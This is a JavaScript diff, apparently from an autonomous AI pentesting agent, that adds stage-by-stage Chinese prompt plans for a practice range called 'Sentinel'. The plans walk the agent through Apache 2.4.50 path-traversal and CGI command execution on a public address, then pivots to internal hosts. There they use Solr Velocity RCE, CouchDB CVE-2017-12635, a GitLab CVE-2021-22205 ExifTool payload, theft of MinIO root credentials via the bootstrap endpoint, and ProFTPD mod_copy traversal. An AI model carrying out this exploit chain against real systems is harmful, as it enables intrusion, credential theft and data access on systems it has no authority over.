@@ -51,9 +51,11 @@ export async function startAgent(config) {
     loopIndex++;
     const loopPlan = buildLoopPlan(loopIndex, {
       flagsFound: flagCounter.count(),
+      foundFlags: flagCounter.all(),
       staleLoops,
       lastSummary: prevSummary,
       iterations: whiteboard.iterations,
+      target: config.target,
     });
     const promptWhiteboardSummary = whiteboard.summary({
       maxIterations: 3,
@@ -75,8 +77,11 @@ export async function startAgent(config) {
     });
     if (isAccessRecoveryPlan(loopPlan)) {
       playbookRecommendations = playbookRecommendations.filter((item) =>
-        /spring4shell|post-foothold/i.test(item.id),
+        /apache-httpd|post-foothold/i.test(item.id),
       );
+    }
+    if (isSentinelGitLabBlocked(loopPlan, whiteboard.iterations, prevSummary)) {
+      playbookRecommendations = playbookRecommendations.filter((item) => !/gitlab/i.test(item.id));
     }
 
     const flagTarget = config.maxFlags ? `${config.flagsNeeded}-${config.maxFlags}` : `${config.flagsNeeded}+`;
@@ -227,18 +232,21 @@ function prepareAgentWorkspace(config) {
 
 function buildLoopPlan(loopIndex, state) {
   const foothold = detectFootholdState(state.iterations || []);
-  if (foothold.hasFoothold && foothold.footholdBroken && !foothold.hasActiveAccess) {
+  if ((foothold.hasFoothold || foothold.hasEntryFileRead) && foothold.footholdBroken && !foothold.hasActiveAccess) {
     return {
       title: `第 ${loopIndex} 轮：入口访问恢复与最小内网路径复核`,
       goals: [
-        "不要执行内网服务 playbook；当前缺少可用 RCE/C2/SSH 通道，先确认入口访问是否仍可执行命令。",
-        "只验证少量恢复路径：现有 webshell 状态、是否可关闭 AccessLogValve、是否存在备用 webshell、是否配置 callback host；写新 JSP 或修复 webshell 最多尝试 2 次。",
+        "不要执行内网服务 playbook；当前缺少可用 RCE/C2/SSH 通道，先确认入口访问是否仍可执行命令。仅文件读取或读到入口 flag 不等于已获得 foothold。",
+        "只验证少量恢复路径：现有 RCE/webshell/CGI 是否仍可执行命令、是否存在备用入口、是否可重新利用已知漏洞写入新文件；恢复尝试最多 2 次。",
         "如果恢复了命令执行，立即执行基础枚举并保存路由证据；如果只是间歇执行，也不要阻塞在持久化上，优先用简单短命令从入口节点探测少量高价值内网 HTTP 服务。",
-        "如果完全无法执行命令，停止并明确需要靶场重置、callback host 或授权跳板。",
+        "如果完全无法执行命令，停止并明确需要靶场重置、修复 CGI handler、授权跳板或其他可执行命令通道；若存在 DMZ 出站限制，callback/proxy 不能替代入口 RCE。",
         "不要从本机直接扫描内网私网段；只有通过已控入口或授权跳板观察到的内网服务才进入后续 playbook。",
       ],
     };
   }
+
+  const sentinelPlan = buildSentinelLoopPlan(loopIndex, state, foothold);
+  if (sentinelPlan) return sentinelPlan;
 
   if (foothold.hasFoothold && !foothold.hasInternalCoverage) {
     return {
@@ -319,6 +327,135 @@ function buildLoopPlan(loopIndex, state) {
   };
 }
 
+function buildSentinelLoopPlan(loopIndex, state = {}, foothold = {}) {
+  const text = collectStateText(state);
+  if (!isSentinelContext(text)) return null;
+
+  const flags = (state.foundFlags || []).join("\n");
+  const hasEntry = /sentinel_dmz_httpd_42013/i.test(flags) || /sentinel_dmz_httpd_42013|entry01.*flag/i.test(text);
+  const hasSolr = /sentinel_wiki_solr_velocity|solr_velocity/i.test(flags) || /sentinel_wiki_solr_velocity|Solr.*flag/i.test(text);
+  const hasCouch = /sentinel_cache_couchdb_chain/i.test(flags) || /sentinel_cache_couchdb_chain|CouchDB.*flag|cache01.*flag/i.test(text);
+  const hasGit = /FLAG\{[^}]*sentinel[^}]*git|FLAG\{[^}]*gitlab|FLAG\{[^}]*git01/i.test(flags);
+  const hasMinio = /FLAG\{[^}]*sentinel[^}]*minio|FLAG\{[^}]*minio|FLAG\{[^}]*object/i.test(flags);
+  const hasFiles = /FLAG\{[^}]*sentinel[^}]*files|FLAG\{[^}]*proftpd|FLAG\{[^}]*files01/i.test(flags);
+  const gitBlocked = isSentinelGitLabBlocked(null, state.iterations || [], state.lastSummary);
+
+  if (!hasEntry) {
+    return {
+      title: `第 ${loopIndex} 轮：Sentinel 阶段 1 - entry01 入口确认与最小 foothold`,
+      goals: [
+        "只验证授权入口 47.238.225.21:18081 的 Apache 2.4.50 指纹、/icons/ 路径穿越和 /cgi-bin/ RCE；不要访问本地 docker/history。",
+        "用 /icons/.%%32%65/.../flag.txt 获取 entry01 flag；随后用 /cgi-bin/.../bin/sh 执行 id、hostname、ip addr、ip route、cat /etc/hosts、command -v curl sh bash nc perl base64。",
+        "保存首页、响应头、entry flag、RCE 输出和路由证据到 artifacts；本轮不要打 Solr/CouchDB/GitLab/MinIO。",
+        "如果 HTTP 应用层无响应或 CGI 不执行，立即停止并报告需要重置 entry01；不要用 callback/proxy 代替。",
+      ],
+    };
+  }
+
+  if (!foothold.hasActiveAccess && !/uid=\d+|CGI RCE.*(?:可用|WORKING|成功)|RCE.*(?:可用|WORKING|成功)/i.test(text)) {
+    return {
+      title: `第 ${loopIndex} 轮：Sentinel 阶段 1b - 恢复 entry01 命令执行`,
+      goals: [
+        "先确认 /cgi-bin/.../bin/sh 是否仍能执行 id；只有命令执行可用才继续内网。",
+        "若 RCE 可用，只做基础枚举和固定内网探测；若不可用，停止并报告需要重置 entry01。",
+        "不要从本机直连扫描 10.92 私网段，不要重复读取 entry01 本地文件。",
+      ],
+    };
+  }
+
+  if (!hasSolr || !hasCouch) {
+    return {
+      title: `第 ${loopIndex} 轮：Sentinel 阶段 2 - 快速拿 Solr 与 CouchDB 节点`,
+      goals: [
+        "通过 entry01 RCE 使用 curl 访问固定 Sentinel 内网服务清单：10.92.20.10:80、10.92.20.11:8983、10.92.30.30:5984、10.92.20.20:80、10.92.30.50:9000、10.92.30.40:21。",
+        "若 Solr flag 未拿：按 Solr Velocity playbook 最小步骤执行，只取 core、启用/验证 Velocity、id/whoami、cat /flag.txt；拿到后立即停止 Solr。",
+        "若 CouchDB flag 未拿：优先 10.92.30.30:5984 的 /、/_all_dbs、/_utils/、CVE-2017-12635 admin 创建和 _config/os_daemon 链；拿到 flag 后立即停止 CouchDB。",
+        "本轮禁止 GitLab 登录/注册/默认密码、MinIO 默认凭据、entry01 本地文件翻找和大范围网段扫描。",
+        "如果 CouchDB 一次不可达，只记录状态并继续 Solr/服务证据；不要在本轮耗尽大量 IP 变体。",
+      ],
+    };
+  }
+
+  if (!hasGit && !gitBlocked) {
+    return {
+      title: `第 ${loopIndex} 轮：Sentinel 阶段 3 - GitLab ExifTool in-band 写文件取证`,
+      goals: [
+        "只做 GitLab 13.9/13.10 指纹摘要和 CVE-2021-22205 ExifTool RCE；禁止注册、登录、默认密码、GraphQL、公共项目枚举和整页 HTML 输出。",
+        "不要使用反向 shell/proxy。生成 CVE-2021-22205 恶意图片 payload，命令固定为 cat /flag.txt > /home/git/gitlab/public/gitflag.txt；通过 entry01 RCE 将 payload 写入 /tmp 后 curl -F 上传到 http://10.92.20.20/<随机路径>。",
+        "上传返回 422 可作为 ExifTool 解析触发的辅助证据；随后立刻通过 entry01 RCE 执行 curl -s http://10.92.20.20/gitflag.txt 读取 flag。",
+        "最多尝试 2 个明确上传端点/参数变体；每个只记录 HTTP code、Location、title、关键错误和 /gitflag.txt 读取结果，不输出整页 HTML。",
+        "若两次 payload 都无法让 /gitflag.txt 出现 flag，标记 GitLab ExifTool in-band 失败并停止 GitLab，不要回到登录/注册路线。",
+      ],
+    };
+  }
+
+  if (!hasMinio || !hasFiles) {
+    return {
+      title: `第 ${loopIndex} 轮：Sentinel 阶段 4 - MinIO 凭据链与 ProFTPD 补缺`,
+      goals: [
+        "GitLab 已阻塞或已完成后，本轮禁止继续 GitLab、entry01 本地枚举、自建 CGI、默认密码爆破和 MinIO 匿名硬撞。",
+        "若 MinIO flag 未拿，先通过 entry01 RCE 请求 http://10.92.30.50:9000/minio/health/live 和 http://10.92.30.50:9000/flag/flag.txt；AccessDenied 说明对象存在但需要认证。",
+        "随后通过 entry01 RCE 执行 POST http://10.92.30.50:9000/minio/bootstrap/v1/verify，从 JSON 的 MinioEnv 提取 MINIO_ROOT_USER 和 MINIO_ROOT_PASSWORD；这是 Sentinel 目标侧泄露证据，不是本地 docker 文件。",
+        "在本机用 Python 标准库根据泄露的 root user/password 为 GET http://10.92.30.50:9000/flag/flag.txt 生成 5 分钟 AWS SigV4 presigned URL；再通过 entry01 RCE curl 该 URL 读取 MinIO flag。entry01 上 curl 无 --aws-sigv4、perl 缺 Digest::SHA 时不要卡住。",
+        "ProFTPD 只做单一 FTP 控制连接内的 mod_copy/chroot 变体：CPFR /flag.txt、../../flag.txt、../../../flag.txt、/../../flag.txt、/../../../flag.txt，CPTO 到 /data/<随机名>.txt，再 RETR；不要因为单个 550 放弃，也不要无限扩展。",
+        "本轮结束必须输出剩余节点的精确阻塞条件和下一轮是否还值得继续。",
+      ],
+    };
+  }
+
+  return {
+    title: `第 ${loopIndex} 轮：Sentinel 收尾复核`,
+    goals: [
+      "只复核 scoreboard 缺口和证据链完整性；不要重复利用已拿节点。",
+      "如无新目标侧凭据或新服务证据，停止并输出最终阻塞判断。",
+    ],
+  };
+}
+
+function collectStateText(state = {}) {
+  const parts = [
+    state.target,
+    state.lastSummary,
+    ...(state.foundFlags || []),
+  ];
+  for (const iter of state.iterations || []) {
+    parts.push(
+      iter.summary,
+      iter.position,
+      ...(iter.flags || []),
+      ...(iter.hosts || []),
+      ...(iter.services || []).map((svc) => `${svc.host || ""}:${svc.port || ""} ${svc.name || ""}`),
+      ...(iter.actions || []),
+      ...(iter.nextSteps || []),
+      ...(iter.intel || []),
+      ...(iter.problems || []).flatMap((p) => [p.symptom, p.cause, p.resolution]),
+      ...(iter.toolCalls || []).flatMap((call) => [call.command, call.purpose, call.result, call.impact]),
+    );
+  }
+  return parts.filter(Boolean).join("\n");
+}
+
+function isSentinelContext(text = "") {
+  return /sentinel|entry01|edge-dmz|Apache\/?2\.4\.50|47\.238\.225\.21:18081|10\.92\.(?:10|20|30)\./i.test(String(text || ""));
+}
+
+function isSentinelGitLabBlocked(loopPlan = null, iterations = [], lastSummary = "") {
+  const text = [
+    loopPlan?.title,
+    ...(loopPlan?.goals || []),
+    lastSummary,
+    ...iterations.map((iter) => [
+      iter.summary,
+      ...(iter.actions || []),
+      ...(iter.nextSteps || []),
+      ...(iter.problems || []).flatMap((p) => [p.symptom, p.cause, p.resolution]),
+      ...(iter.toolCalls || []).flatMap((call) => [call.command, call.result, call.impact]),
+    ].flat().filter(Boolean).join("\n")),
+  ].filter(Boolean).join("\n");
+  if (!isSentinelContext(text)) return false;
+  return /GitLab ExifTool in-band.*(?:失败|failed|blocked)|\/gitflag\.txt.*(?:404|not found|无 flag|未出现).*2\s*次|2\s*个.*ExifTool.*(?:均无|都无|失败)|CVE-2021-22205.*in-band.*(?:无效|失败|no RCE|未能验证)/i.test(text);
+}
+
 function isAccessRecoveryPlan(loopPlan = {}) {
   return /入口访问恢复|访问恢复|RCE.*恢复|缺少可用 RCE|缺少可用.*通道/i.test([
     loopPlan.title,
@@ -340,15 +477,16 @@ function detectFootholdState(iterations = []) {
   const text = entries.join("\n");
   const latestText = entries.at(-1) || "";
 
-  const hasFoothold = /webshell|shell\.jsp|反弹\s*shell|命令执行|RCE|whoami|uid=\d+|gid=\d+|hostname|\/flag\.txt|已获得.*(?:shell|访问|权限)|获得.*flag/i.test(text);
-  const footholdBroken = /shell\.jsp.*(?:500|编译错误|损坏|不可用)|webshell.*(?:损坏|不可用|无法恢复)|RCE.*(?:不可用|丢失|无法恢复)|无RCE权限|无法恢复.*RCE|返回500|quote symbol expected/i.test(latestText);
+  const hasEntryFileRead = /路径穿越|文件读取|\/icons\/|\/flag\.txt|入口.*flag|获得.*flag|FLAG\{/i.test(text);
+  const hasFoothold = /webshell|shell\.jsp|反弹\s*shell|RCE\s*(?:成功|可用)|命令执行\s*(?:成功|可用)|whoami\s*[:=]?\s*\w+|uid=\d+|gid=\d+|已获得.*(?:shell|访问|权限|命令执行)|(?:id|whoami|hostname|ip route).{0,80}(?:uid=|root|entry01|10\.)/i.test(text);
+  const footholdBroken = /shell\.jsp.*(?:500|编译错误|损坏|不可用)|webshell.*(?:损坏|不可用|无法恢复)|RCE.*(?:不可用|丢失|无法恢复|503|Service Unavailable)|CGI.*(?:503|不可用|Service Unavailable)|cgi-bin.*503|无RCE权限|无法恢复.*RCE|返回500|quote symbol expected/i.test(latestText);
   const hasActiveAccess = /(?:成功|可用|已获得|控制|root权限|webshell RCE访问).{0,80}(?:RCE|webshell|shell|C2|SSH|命令执行|root权限)|(?:RCE|webshell|shell|C2|SSH|命令执行).{0,80}(?:成功|可用|已获得|控制|root权限)/i.test(latestText) && !footholdBroken;
   const hasRouteEvidence = /ip route|route -n|ip addr|ifconfig|\/etc\/hosts|\/etc\/resolv\.conf|内网|private pivot|pivot|横向|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[0-1])\.\d+\.\d+|192\.168\.\d+\.\d+/i.test(text);
   const serviceHits = countInternalServiceHits(iterations);
   const hasInternalCoverage = hasRouteEvidence && serviceHits >= 2;
   const hasPostFootholdAttack = /(solr|gitlab|gogs|redis|samba|smbclient|couchdb|proftpd|ftp|minio|struts|ldap|mysql|postgres|mongodb).*(flag|漏洞|利用|RCE|读取|认证|登录)|Playbook 使用[\s\S]{0,120}(solr|gitlab|gogs|redis|samba|couchdb|proftpd|minio|struts)/i.test(text);
 
-  return { hasFoothold, footholdBroken, hasActiveAccess, hasInternalCoverage, hasPostFootholdAttack };
+  return { hasFoothold, hasEntryFileRead, footholdBroken, hasActiveAccess, hasInternalCoverage, hasPostFootholdAttack };
 }
 
 function countInternalServiceHits(iterations = []) {
